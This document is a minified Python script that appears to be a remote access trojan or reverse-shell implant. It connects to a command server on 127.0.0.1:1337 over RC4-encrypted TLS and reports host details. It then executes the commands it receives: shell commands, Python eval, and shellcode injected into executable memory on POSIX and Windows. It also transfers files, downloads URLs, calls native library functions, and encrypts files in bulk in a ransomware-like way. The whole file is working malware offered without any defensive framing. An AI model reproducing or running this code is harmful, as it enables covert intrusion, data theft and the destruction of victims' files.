#!/usr/bin/env python3
_R=b'\r\n\r\n'
_Q=b'{length}'
_P=b'{type}'
_O='update_environment'
_N='127.0.0.1'
_M='archive_files '
_L='void *'
_K='unsigned short'
_J='unsigned long long'
_I='unsigned long'
_H='unsigned byte'
_G='long long'
_F='double'
_E='char *'
_D='latin-1'
_C=False
_B=b' '
_A=True
from glob import iglob
from json import dumps
from shlex import split
from io import StringIO
from socket import socket
from getpass import getuser
from zipfile import ZipFile
from contextlib import suppress
from subprocess import run,PIPE
from platform import node,system
from urllib.parse import urlparse
from sys import argv,stderr,exit
from urllib.request import urlopen
from tarfile import open as taropen
from os.path import exists,basename
from gzip import compress as h,decompress as g
from base64 import b85decode as k,b85encode as l
from ssl import _create_unverified_context
from multiprocessing import Process,active_children
from contextlib import redirect_stderr as a,redirect_stdout as b
from os import getcwd,environ,listdir,name,urandom,chdir
from ctypes import cdll,c_bool,c_byte,c_char,c_char_p,c_double,c_float,c_long,c_longlong,c_short,c_ubyte,c_ulong,c_ulonglong,c_ushort,c_void_p,c_wchar,c_wchar_p
c_types={'bool':c_bool,'byte':c_byte,'char':c_char,_E:c_char_p,_F:c_double,'float':c_float,'long':c_long,_G:c_longlong,'short':c_short,_H:c_ubyte,_I:c_ulong,_J:c_ulonglong,_K:c_ushort,_L:c_void_p,'wchar':c_wchar,'wchar *':c_wchar_p}
if len(argv)!=2:print(f"USAGES: {argv[0]} key",file=stderr);exit(1)
key=argv[1].encode()
def init_key():
	S=list(range(256));j=0
	for i in range(256):j=(j+S[i]+key[i%len(key)])%256;S[i],S[j]=S[j],S[i]
	return bytes(S)
key=init_key()
key_temp=None
def rc4(plaintext,decrypt=_C):
	global key_temp,key
	if decrypt:iv=plaintext[:256];plaintext=plaintext[256:]
	else:iv=urandom(256)
	temp_key=bytearray([iv[i]^char for(i,char)in enumerate(key)]);out=bytearray();i=j=0
	for char in plaintext:i=(i+1)%256;j=(j+temp_key[i])%256;temp_key[i],temp_key[j]=temp_key[j],temp_key[i];out.append(char^temp_key[(temp_key[i]+temp_key[j])%256])
	if key_temp:key=bytes([key[i%len(key)]^char for(i,char)in enumerate(key_temp)]);key_temp=None
	if decrypt:return out
	return iv+out
def encrypt_files(key,*paths,decrypt=_C):
	for path in paths:
		for filepath in iglob(path,recusive=True):process=Process(target=encrypt_file,args=(key,filepath,decrypt),name=('decrypt'if decrypt else'encrypt')+'_file '+repr(filepath));process.start()
def encrypt_file(key_,path,decrypt=_C):
	global key;key=key_.encode();key=init_key()
	with open(path,'rb+')as file:f=rc4(file.read(),decrypt);file.seek(0);file.write(f);file.truncate()
def make_tar_archive():
	with taropen(name,'w:'+indexed_extensions.get(index+1,''))as tarfile:tuple(tarfile.add(filepath)for path in paths for filepath in iglob(path,recusive=True))
def make_zip_archive(name,*paths):
	with ZipFile(name,'w')as zipfile:tuple(zipfile.write(filepath)for path in paths for filepath in iglob(path,recusive=True))
def archive_files(name,*paths):
	A='tar';indexed_extensions={x if x==A else i:i if x==A else x for(i,x)in enumerate(name.split('.'))}
	if(index:=indexed_extensions.get(A)):make_archive=make_tar_archive
	elif name.endswith('.zip'):make_archive=make_zip_archive
	else:return b'Filename error, extension must be ".zip", ".tar.gz", ".tar.bz2", ".tar.xz" or ".tar"'
	process=Process(target=make_archive,args=(name,*paths),name=_M+name);process.start();return b'Making archive...'
def call_library_function(library,function,*params):
	function=getattr(cdll.LoadLibrary(library),function);params_=[]
	for param in params:
		typename,_,value=param.partition(':')
		if typename=='bool':value=value.casefold()in('true','1','on')
		elif typename in('byte','long',_G,'short',_H,_I,_J,_K,_L):value=int(value)
		elif typename=='char':value=int(value)if len(value)!=1 else value.encode(_D)
		elif typename==_E:value=value.encode()
		elif typename==_F or typename=='float':value=float(value)
		params_.append(c_types[typename](value))
	function.restype=c_void_p;value=function(*params_);return b'Return value: '+str(value).encode('ascii')
def download_from_url(url,filename=None):
	try:response=urlopen(url)
	except Exception as e:return f"{e.__class__.__name__}: {e}".encode()
	if not filename:filename=basename(urlparse(url).path)or'download.txt'
	with open(filename,'wb')as file:file.write(response.read())
	return b'Done'
def get_executables():return[file for directory in environ['PATH'].split(':'if name!='nt'else';')if exists(directory)for file in listdir(directory)]
def sendall(s,f):
	chunk=f[:30000];f=f[30000:]
	while chunk:s.sendall(chunk);chunk=f[:30000];f=f[30000:]
def posix_shellcode(shellcode):
	from mmap import mmap,PAGESIZE,MAP_SHARED,PROT_READ,PROT_WRITE,PROT_EXEC;from ctypes import string_at,CFUNCTYPE,c_void_p;memory=mmap(-1,PAGESIZE,MAP_SHARED,PROT_READ|PROT_WRITE|PROT_EXEC);memory.write(shellcode);address=int.from_bytes(string_at(id(memory)+16,8),'little');function_type=CFUNCTYPE(c_void_p);shellcode_function=function_type(address);stdout=StringIO();stderr=StringIO()
	with b(stdout),a(stderr):shellcode_function()
	return(stdout.getvalue()+stderr.getvalue()).encode()or _B
def nt_shellcode(shellcode):
	from ctypes import c_ulonglong,pointer as get_pointer,c_char,c_void_p,windll;kernel32=windll.kernel32;shellcode_length=len(shellcode);shellcode=bytearray(shellcode);kernel32.VirtualAlloc.restype=c_void_p;pointer=kernel32.VirtualAlloc(c_ulonglong(0),c_ulonglong(shellcode_length),c_ulonglong(12288),c_ulonglong(64));buffer=(c_char*shellcode_length).from_buffer(shellcode);kernel32.RtlMoveMemory(c_ulonglong(pointer),buffer,c_ulonglong(shellcode_length));stdout=StringIO();stderr=StringIO()
	with b(stdout),a(stderr):thread=kernel32.CreateThread(c_ulonglong(0),c_ulonglong(0),c_ulonglong(pointer),c_ulonglong(0),c_ulonglong(0),get_pointer(c_ulonglong(0)))
	kernel32.WaitForSingleObject(c_ulonglong(thread),c_ulonglong(-1));return(stdout.getvalue()+stderr.getvalue()).encode()or _B
format_=b'POST / HTTP/1.0\r\nContent-Type: {type}\r\nHost: 127.0.0.1\r\nContent-Length: {length}\r\n\r\n'
context=_create_unverified_context()
def send_environnement(all=_A):
	B='files';A='cwd';global key_temp;recevied=b''
	while recevied!=b'\x06':s=socket();s.connect((_N,1337));f=rc4(b'\x01'+(dumps({'hostname':node(),'user':getuser(),A:getcwd(),'executables':get_executables()+['cd',_O,'upload_file','download_file','download_url','python3_exec','upload_file_compress','download_file_compress','python3_exec_compress','shellcode','shellcode_compress','encrypt_file','encrypt_files','decrypt_file','decrypt_files','archive_files','call_library_function'],B:listdir(),'system':system(),'encoding':'base85','commpression':'gzip','key':l(h((key_temp:=urandom(256)))).decode()}).encode()if all else dumps({B:listdir(),A:getcwd()}).encode()));s=context.wrap_socket(s);sendall(s,format_.replace(_P,b'application/json; charset=utf-8').replace(_Q,str(len(f)).encode(_D))+f);recevied=rc4(s.recv(65535).split(_R,1)[1],_A);s.close()
def python_exec(code):
	stdout=StringIO();stderr=StringIO()
	with b(stdout),a(stderr):stdout.write(str(eval(code)))
	return(stdout.getvalue()+stderr.getvalue()).encode()or _B
def command(f):
	F=b'Decryption is running...';E='decrypt_file ';D=b'Encryption is running...';C='encrypt_file ';B='_shellcode';A=b'done';s=socket();s.connect((_N,1337));s=context.wrap_socket(s);sendall(s,format_.replace(_P,b'text/plain; charset=utf-8').replace(_Q,str(len(f)).encode(_D))+rc4(f));d=rc4(s.recv(65535).split(_R,1)[1],_A).decode()
	if d.strip().startswith('cd '):f=A;chdir(d[3:]);send_environnement(_C)
	elif d.strip()==_O:send_environnement();f=A
	elif c(d,'upload_file '):_,filename,content=split(d);open(filename,'wb').write(k(content.encode()));f=A
	elif c(d,'upload_file_compress '):_,filename,content=split(d);open(filename,'wb').write(g(k(content.encode())));f=A
	elif c(d,'download_file '):f=l(open(d[14:],'rb').read())
	elif c(d,'download_file_compress '):f=l(h(open(d[23:],'rb').read()))
	elif c(d,'python3_exec '):f=python_exec(d[13:])
	elif c(d,'python3_exec_compress '):f=python_exec(g(k(d[22:])))
	elif c(d,'shellcode '):f=globals()[name+B](k(d[10:]))
	elif c(d,'shellcode_compress '):f=globals()[name+B](g(k(d[19:])))
	elif c(d,C):_,encryption_key,file=split(d);process=Process(target=encrypt_file,args=(encryption_key,file),name=C+repr(file));process.start();f=D
	elif c(d,'encrypt_files '):encrypt_files(*split(d)[1:]);f=D
	elif c(d,E):_,encryption_key,file=split(d);process=Process(target=encrypt_file,args=(encryption_key,file,_A),name=E+repr(file));process.start();f=F
	elif c(d,'decrypt_files '):encrypt_files(*split(d)[1:],decrypt=_A);f=F
	elif c(d,'download_url '):f=download_from_url(*split(d)[1:])
	elif c(d,_M):f=archive_files(*split(d)[1:])
	elif c(d,'call_library_function '):f=call_library_function(*split(d)[1:])
	else:p=run(d,shell=_A,stdout=PIPE,stderr=PIPE);f=p.stdout+p.stderr or _B;s.close()
	childs=len(active_children())
	if childs:f+=b'\n\x1b[34m[*] '+str(childs).encode('ascii')+b' childs process are running...'
	return f
while _A and __name__=='__main__':
	c = lambda x,y: x.strip().startswith(y)
	with suppress(Exception):
		send_environnement();f=_B
		while _A:
			try:f=command(f)
			except Exception as e:f=f"{e.__class__.__name__}: {e}".encode();raise e